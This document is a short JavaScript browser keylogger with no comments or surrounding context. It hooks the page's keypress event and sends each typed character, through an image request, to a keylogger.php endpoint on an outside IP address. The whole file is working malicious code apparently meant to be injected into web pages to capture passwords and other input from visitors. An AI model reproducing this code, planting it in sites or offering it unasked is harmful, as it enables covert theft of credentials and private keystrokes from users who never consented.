var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';

document.onkeypress = function(e) {
	var keys='';
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	if(keys){
	    new Image().src = url+keys;
	}
}



